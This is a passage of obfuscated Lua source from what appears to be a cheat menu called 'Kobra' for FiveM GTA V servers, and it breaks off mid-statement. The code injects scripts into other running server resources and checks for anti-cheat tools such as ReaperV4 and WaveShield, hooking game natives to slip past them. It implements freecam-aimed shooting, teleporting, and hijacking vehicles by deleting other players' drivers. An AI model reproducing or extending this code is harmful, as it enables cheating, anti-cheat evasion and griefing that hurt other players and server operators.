                                    ]],v1490,v1493));v1483=1249 -(965 + 278) ;end if (v1483==(1730 -(1391 + 338))) then hNative("CreateThread",function(v1625,...) return v1625(...);end);hNative("Wait",function(v1626,...) return v1626(...);end);hNative("PlayerPedId",function(v1627,...) return v1627(...);end);hNative("GetHashKey",function(v1628,...) return v1628(...);end);v1483=2;end if (v1483==0) then print("UPP3R");v1484=nil;function v1484(v1629) local v1630=math.rad(v1629.z);local v1631=math.rad(v1629.x);local v1632=math.abs(math.cos(v1631));return vector3( -math.sin(v1630) * v1632 ,math.cos(v1630) * v1632 ,math.sin(v1631));end function hNative(v1633,v1634) local v1635=_G[v1633];if ( not v1635 or (type(v1635)~="function")) then return;end _G[v1633]=function(...) return v1634(v1635,...);end;end v1483=2 -1 ;end if (v1483==(4 + 0)) then v1488=2168 -1168 ;v1489=v1485 + (v1487 * v1488) ;v1490=PlayerPedId();v1491=GetHashKey(v910);v1483=2 + 3 ;end if ((1414 -(496 + 912))==v1483) then Wait(493 -343 );ShootSingleBulletBetweenCoords(v1485.x,v1485.y,v1485.z,v1489.x,v1489.y,v1489.z,25 + 75 ,true,v1491,v1490,true,false,189568 -89568 );break;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v910   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1371=1330 -(1190 + 140) ;local v1372;local v1373;local v1374;local v1375;local v1376;local v1377;local v1378;local v1379;while true do if (v1371==(2 + 1)) then v1374=GetCamRot(_G.KobraFreecamObject,720 -(317 + 401) );v1375=v1372(v1374);v1376=1000;v1377=v1373 + (v1375 * v1376) ;v1371=953 -(303 + 646) ;end if (v1371==(3 -2)) then hNative("Wait",function(v1553,...) return v1553(...);end);hNative("PlayerPedId",function(v1554,...) return v1554(...);end);hNative("GetHashKey",function(v1555,...) return v1555(...);end);hNative("GiveWeaponToPed",function(v1556,...) return v1556(...);end);v1371=1734 -(1675 + 57) ;end if (v1371==(3 + 1)) then v1378=PlayerPedId();v1379=GetHashKey(v910);GiveWeaponToPed(PlayerPedId(),v1379,653 -403 ,false,true);SetCurrentPedWeapon(PlayerPedId(),v1379,true);v1371=1 + 4 ;end if (v1371==2) then hNative("SetCurrentPedWeapon",function(v1557,...) return v1557(...);end);hNative("GetCurrentPedWeapon",function(v1558,...) return v1558(...);end);hNative("RemoveWeaponFromPed",function(v1559,...) return;end);v1373=GetCamCoord(_G.KobraFreecamObject);v1371=3;end if (v1371==(977 -(338 + 639))) then v1372=nil;function v1372(v1560) local v1561=379 -(320 + 59) ;local v1562;local v1563;local v1564;while true do if (v1561==(1 + 0)) then v1564=math.abs(math.cos(v1563));return vector3( -math.sin(v1562) * v1564 ,math.cos(v1562) * v1564 ,math.sin(v1563));end if (v1561==0) then v1562=math.rad(v1560.z);v1563=math.rad(v1560.x);v1561=733 -(628 + 104) ;end end end function hNative(v1565,v1566) local v1567=0 -0 ;local v1568;while true do if ((1892 -(439 + 1452))==v1567) then _G[v1565]=function(...) return v1566(v1568,...);end;break;end if (v1567==0) then v1568=_G[v1565];if ( not v1568 or (type(v1568)~="function")) then return;end v1567=1948 -(105 + 1842) ;end end end hNative("CreateThread",function(v1569,...) return v1569(...);end);v1371=1;end if (v1371==5) then ShootSingleBulletBetweenCoords(v1373.x,v1373.y,v1373.z,v1377.x,v1377.y,v1377.z,100,true,v1379,v1378,true,false,457484 -357484 );break;end end end break;end end end end if IsDisabledControlJustPressed(0 -0 ,115 -91 ) then local v827=v692;if (v827=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1271=0;local v1272;local v1273;local v1274;local v1275;local v1276;local v1277;local v1278;local v1279;local v1280;local v1281;local v1282;while true do if (v1271==(0 + 0)) then v1272=nil;function v1272(v1405) local v1406=math.rad(v1405.z);local v1407=math.rad(v1405.x);local v1408=math.abs(math.cos(v1407));return vector3( -math.sin(v1406) * v1408 ,math.cos(v1406) * v1408 ,math.sin(v1407));end function GetEmptySeat(v1409) local v1410=0 -0 ;local v1411;while true do if (v1410==0) then v1411={ -1,0,1,2 + 0 };for v1576,v1577 in ipairs(v1411) do if IsVehicleSeatFree(v1409,v1577) then return v1577;end end v1410=1;end if (1==v1410) then return  -(1165 -(274 + 890));end end end v1271=1 + 0 ;end if (v1271==(1 + 0)) then v1273=GetCamCoord(_G.KobraFreecamObject);v1274=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1275=v1272(v1274);v1271=2 + 0 ;end if (v1271==3) then v1279,v1280,v1281,v1279,v1282=GetShapeTestResult(v1278);if v1280 then if ((v1282~=(0 + 0)) and IsEntityAVehicle(v1282)) then local v1570=v1282;local v1571=PlayerPedId();local v1572=GetEmptySeat(v1570);if (v1572== -(1 -0)) then TaskWarpPedIntoVehicle(v1571,v1570, -(820 -(731 + 88)));elseif (v1572>=(0 + 0)) then TaskWarpPedIntoVehicle(v1571,v1570,v1572);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end else SetEntityCoords(PlayerPedId(),v1281.x,v1281.y,v1281.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end if (v1271==2) then v1276=614 + 386 ;v1277=v1273 + (v1275 * v1276) ;v1278=StartShapeTestRay(v1273.x,v1273.y,v1273.z,v1277.x,v1277.y,v1277.z, -(1 + 0),PlayerPedId(),0 -0 );v1271=3;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local function v1107(v1190) local v1191=0 -0 ;local v1192;local v1193;local v1194;while true do if (v1191==(2 -1)) then v1194=math.abs(math.cos(v1193));return vector3( -math.sin(v1192) * v1194 ,math.cos(v1192) * v1194 ,math.sin(v1193));end if (v1191==0) then v1192=math.rad(v1190.z);v1193=math.rad(v1190.x);v1191=1 -0 ;end end end function GetEmptySeat(v1195) local v1196={ -(1 + 0),0 + 0 ,1 + 0 ,7 -5 };for v1283,v1284 in ipairs(v1196) do if IsVehicleSeatFree(v1195,v1284) then return v1284;end end return  -1;end local v1108=GetCamCoord(_G.KobraFreecamObject);local v1109=GetCamRot(_G.KobraFreecamObject,2);local v1110=v1107(v1109);local v1111=2154 -(1018 + 136) ;local v1112=v1108 + (v1110 * v1111) ;local v1113=StartShapeTestRay(v1108.x,v1108.y,v1108.z,v1112.x,v1112.y,v1112.z, -(1 + 0),PlayerPedId(),0 -0 );local v1114,v1115,v1116,v1114,v1117=GetShapeTestResult(v1113);if v1115 then if ((v1117~=(815 -(117 + 698))) and IsEntityAVehicle(v1117)) then local v1340=481 -(305 + 176) ;local v1341;local v1342;local v1343;while true do if (v1340==(0 + 0)) then v1341=v1117;v1342=PlayerPedId();v1340=1 + 0 ;end if (v1340==1) then v1343=GetEmptySeat(v1341);if (v1343== -(1 -0)) then TaskWarpPedIntoVehicle(v1342,v1341, -(1 + 0));elseif (v1343>=(0 -0)) then TaskWarpPedIntoVehicle(v1342,v1341,v1343);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end end else MachoInjectThread(0 -0 ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1116.x   .. [[, ]]   .. v1116.y   .. [[, ]]   .. v1116.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end end elseif (v827=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1118=0 -0 ;local v1119;while true do if (v1118==0) then v1119=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1119,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1285=0;local v1286;local v1287;local v1288;local v1289;local v1290;local v1291;local v1292;local v1293;local v1294;local v1295;local v1296;local v1297;local v1298;local v1299;local v1300;while true do if (v1285==0) then function hNative(v1412,v1413) local v1414=_G[v1412];if ( not v1414 or (type(v1414)~="function")) then return;end _G[v1412]=function(...) return v1413(v1414,...);end;end hNative("CreateThread",function(v1415,...) return v1415(...);end);hNative("Wait",function(v1416,...) return v1416(...);end);hNative("DoesEntityExist",function(v1417,...) return v1417(...);end);hNative("GetEntityCoords",function(v1418,...) return v1418(...);end);hNative("GetCamCoord",function(v1419,...) return v1419(...);end);v1285=261 -(159 + 101) ;end if (v1285==(4 -3)) then hNative("GetCamRot",function(v1420,...) return v1420(...);end);hNative("StartShapeTestRay",function(v1421,...) return v1421(...);end);hNative("GetShapeTestResult",function(v1422,...) return v1422(...);end);hNative("GetPedInVehicleSeat",function(v1423,...) return v1423(...);end);hNative("SetEntityVisible",function(v1424,...) return v1424(...);end);hNative("DeletePed",function(v1425,...) return v1425(...);end);v1285=6 -4 ;end if (v1285==2) then hNative("ClearPedTasksImmediately",function(v1426,...) return v1426(...);end);hNative("SetEntityCoordsNoOffset",function(v1427,...) return v1427(...);end);hNative("IsEntityAVehicle",function(v1428,...) return v1428(...);end);hNative("SetPedIntoVehicle",function(v1429,...) return v1429(...);end);hNative("PlayerPedId",function(v1430,...) return v1430(...);end);hNative("NetworkRequestControlOfEntity",function(v1431,...) return v1431(...);end);v1285=2 + 1 ;end if (v1285==(9 -6)) then hNative("NetworkHasControlOfEntity",function(v1432,...) return v1432(...);end);v1286=nil;function v1286(v1433,v1434) local v1435=0 -0 ;local v1436;while true do if (v1435==(0 + 0)) then v1434=v1434 or 2000 ;v1436=GetGameTimer();v1435=1;end if (v1435==(267 -(112 + 154))) then while (GetGameTimer() -v1436)<v1434  do if NetworkHasControlOfEntity(v1433) then return true;end NetworkRequestControlOfEntity(v1433);Wait(0);end return NetworkHasControlOfEntity(v1433);end end end v1287=nil;function v1287(v1437) local v1438=math.rad(v1437.z);local v1439=math.rad(v1437.x);local v1440=math.abs(math.cos(v1439));return vector3( -math.sin(v1438) * v1440 ,math.cos(v1438) * v1440 ,math.sin(v1439));end function GetEmptySeat(v1441) local v1442=0 -0 ;local v1443;while true do if (v1442==1) then return  -(32 -(21 + 10));end if (v1442==(1719 -(531 + 1188))) then v1443={ -1,0,1,1 + 1 };for v1578,v1579 in ipairs(v1443) do if IsVehicleSeatFree(v1441,v1579) then return v1579;end end v1442=3 -2 ;end end end v1285=1699 -(867 + 828) ;end if ((10 -5)==v1285) then v1294=v1290 + (v1292 * v1293) ;v1295=StartShapeTestRay(v1290.x,v1290.y,v1290.z,v1294.x,v1294.y,v1294.z, -(3 -2),v1288,0 -0 );v1296,v1297,v1298,v1296,v1299=GetShapeTestResult(v1295);v1300=nil;function v1300(v1444) if ( not v1444 or  not DoesEntityExist(v1444)) then return;end local v1445=GetPedInVehicleSeat(v1444, -(1 -0));if ((v1445~=0) and DoesEntityExist(v1445)) then local v1516=0 + 0 ;while true do if (v1516==(3 -1)) then Wait(1);SetPedIntoVehicle(v1288,v1444, -1);Wait(1221 -(134 + 637) );ClearPedTasksImmediately(v1288);v1516=1 + 2 ;end if (v1516==(1157 -(775 + 382))) then SetPedIntoVehicle(v1288,v1444,0 -0 );v1286(v1444,2607 -(45 + 562) );Wait(872 -(545 + 317) );for v1647=0 -0 ,1030 -(763 + 263)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1445   .. [[)
                                        ]] );end v1516=1 + 0 ;end if (v1516==(1753 -(512 + 1238))) then SetEntityCoordsNoOffset(v1288,v1289.x,v1289.y,v1289.z,true,true,true,true);Wait(1694 -(272 + 1322) );break;end if (v1516==1) then Wait(40);SetPedIntoVehicle(v1288,v1444, -(1 -0));Wait(1);SetPedIntoVehicle(v1288,v1444,GetEmptySeat(v1444));v1516=1248 -(533 + 713) ;end end end end CreateThread(function() if v1297 then if ((v1299~=0) and IsEntityAVehicle(v1299)) then local v1580=28 -(14 + 14) ;local v1581;while true do if ((825 -(499 + 326))==v1580) then v1581=v1299;v1300(v1581);break;end end end end end);break;end if (v1285==(6 -2)) then v1288=PlayerPedId();v1289=GetEntityCoords(v1288);v1290=GetCamCoord(_G.KobraFreecamObject);v1291=GetCamRot(_G.KobraFreecamObject,426 -(104 + 320) );v1292=v1287(v1291);v1293=1000;v1285=2002 -(1929 + 68) ;end end end elseif (v827=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1301=0;local v1302;while true do if (v1301==(1323 -(1206 + 117))) then v1302=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1302,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1344=0;local v1345;local v1346;local v1347;local v1348;local v1349;local v1350;local v1351;local v1352;local v1353;local v1354;local v1355;local v1356;local v1357;local v1358;local v1359;while true do if (v1344==2) then hNative("GetShapeTestResult",function(v1517,...) return v1517(...);end);hNative("GetPedInVehicleSeat",function(v1518,...) return v1518(...);end);hNative("SetEntityVisible",function(v1519,...) return v1519(...);end);hNative("DeletePed",function(v1520,...) return v1520(...);end);v1344=3;end if (v1344==(5 + 2)) then v1351=v1346(v1350);v1352=2592 -(683 + 909) ;v1353=v1349 + (v1351 * v1352) ;v1354=StartShapeTestRay(v1349.x,v1349.y,v1349.z,v1353.x,v1353.y,v1353.z, -1,v1347,0 -0 );v1344=14 -6 ;end if (v1344==(783 -(772 + 5))) then v1347=PlayerPedId();v1348=GetEntityCoords(v1347);v1349=GetCamCoord(_G.KobraFreecamObject);v1350=GetCamRot(_G.KobraFreecamObject,1429 -(19 + 1408) );v1344=295 -(134 + 154) ;end if (v1344==(0 -0)) then function hNative(v1521,v1522) local v1523=_G[v1521];if ( not v1523 or (type(v1523)~="function")) then return;end _G[v1521]=function(...) return v1522(v1523,...);end;end hNative("CreateThread",function(v1524,...) return v1524(...);end);hNative("Wait",function(v1525,...) return v1525(...);end);hNative("DoesEntityExist",function(v1526,...) return v1526(...);end);v1344=3 -2 ;end if (v1344==(2 + 2)) then hNative("PlayerPedId",function(v1527,...) return v1527(...);end);hNative("NetworkRequestControlOfEntity",function(v1528,...) return v1528(...);end);hNative("NetworkHasControlOfEntity",function(v1529,...) return v1529(...);end);v1345=nil;v1344=5 + 